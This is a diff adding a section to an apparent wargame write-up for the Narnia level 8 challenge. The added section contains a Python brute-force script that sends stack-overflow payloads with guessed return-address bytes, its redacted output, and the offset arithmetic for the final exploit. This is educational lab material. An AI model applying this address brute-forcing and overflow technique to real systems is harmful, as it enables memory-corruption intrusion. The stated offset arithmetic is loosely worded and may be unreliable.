@@ -645,3 +645,60 @@ eiL5fealae
 $ exit
 
 SWEEEEEEET!!!!!!!! 
+
+=================== More generalizable =================================
+In this particular problem, I was able to debug the address issues outside of gdb because of the print statement piped to xxd.
+But what if we don't have a print to help us? 
+Since we now know that the stack addresses are only a bit different when the program is called with gdb, we should be able to guess it :?
+I wrote a brute forcer to find that first address pointing to b in main which allows the for loop to run. 
+The address of the paload is relative to that first one, so we can do a bit of math to find it.
+In the case of my solution, the payload sits in bok[] at a distance equal to 0xb1-0xd9 (decimal is 40) as seen in the least significant byte of the solution payload above
+
+======== brute.py =================
+#/narnia/narnia8 $(python -c'print "A"*20+"\x9f\xd8\xff\xff"+"B"*64') <= that's our payload to find the address 
+import subprocess
+
+start = 0x01 #start at 0x01 because subprocess.call() throws error if 0x00 is in string
+end = 0xff
+
+for i in xrange(start, end + 1):
+        As = "A"*20
+        addr = chr(i)+"\xd8\xff\xff"
+        Bs = "B"*64
+        payload = str(As+addr+Bs)
+        payload.strip()
+        print "Address LSB: "+format(i, 'X')
+        subprocess.call(['/narnia/narnia8',payload])
+
+========= output ====================
+Address LSB: 1
+AAAAAAAAAAAAAAAAAAAA���
+Address LSB: 2
+AAAAAAAAAAAAAAAAAAAA���
+Address LSB: 3
+AAAAAAAAAAAAAAAAAAAA0��
+A
+-- redacted --
+
+Address LSB: 9B
+AAAAAAAAAAAAAAAAAAAA�A��
+Address LSB: 9C
+AAAAAAAAAAAAAAAAAAAA����
+Address LSB: 9D
+AAAAAAAAAAAAAAAAAAAA����BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+Address LSB: 9E
+Address LSB: 9F
+Address LSB: A0
+AAAAAAAAAAAAAAAAAAAA�B��
+Address LSB: A1
+AAAAAAAAAAAAAAAAAAAA�B��
+
+-- redacted --
+
+AAAAAAAAAAAAAAAAAAAA�i��
+Address LSB: FE
+AAAAAAAAAAAAAAAAAAAA�n��
+Address LSB: FF
+AAAAAAAAAAAAAAAAAAAA�/��
+
+So the stack address we're looking for is 0xffffd89d then we add 40 bytes to that and we can construct the payload :)
